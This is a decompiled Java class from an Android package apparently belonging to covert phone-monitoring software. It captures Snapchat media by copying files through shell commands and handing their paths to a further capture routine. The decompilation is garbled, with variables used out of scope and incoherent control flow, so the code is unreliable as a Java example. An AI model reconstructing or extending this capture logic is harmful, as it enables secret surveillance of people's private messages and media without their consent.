package com.vvt.capture.snapchat.b;

import com.vvt.capture.snapchat.b;
import com.vvt.capture.snapchat.d;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;

class f
  implements Runnable
{
  f(e parame, String paramString) {}
  
  public void run()
  {
    try
    {
      localObject1 = this.b;
      localObject1 = e.a((e)localObject1);
      String str = this.a;
      str = p.a((String)localObject1, str);
      int i = ShellUtil.b(str);
      if (i != 0)
      {
        i = 0;
        localObject1 = null;
        Object localObject3 = this.b;
        localObject3 = e.a((e)localObject3);
        Object localObject4 = "video";
        boolean bool2 = ((String)localObject3).endsWith((String)localObject4);
        if (bool2) {
          i = 1;
        }
        localObject3 = this.b;
        localObject3 = ((e)localObject3).a;
        localObject3 = a.b((a)localObject3);
        localObject1 = b.a((String)localObject3, i);
        localObject3 = this.a;
        localObject1 = p.a((String)localObject1, (String)localObject3);
        localObject3 = this.b;
        localObject3 = ((e)localObject3).a;
        localObject3 = a.b((a)localObject3);
        localObject4 = this.b;
        localObject4 = ((e)localObject4).a;
        localObject4 = a.c((a)localObject4);
        Object localObject5 = this.b;
        localObject5 = ((e)localObject5).a;
        localObject5 = a.d((a)localObject5);
        d.a(str, (String)localObject1, (String)localObject3, (String)localObject4, (String)localObject5);
        bool1 = a.a();
        if (!bool1) {}
      }
      localObject1 = this.b;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        Object localObject1;
        boolean bool1 = a.c();
        if (bool1) {}
        e locale = this.b;
      }
    }
    finally
    {
      e.a(this.b, null);
    }
    e.a((e)localObject1, null);
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/snapchat/removeFromPath/f.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */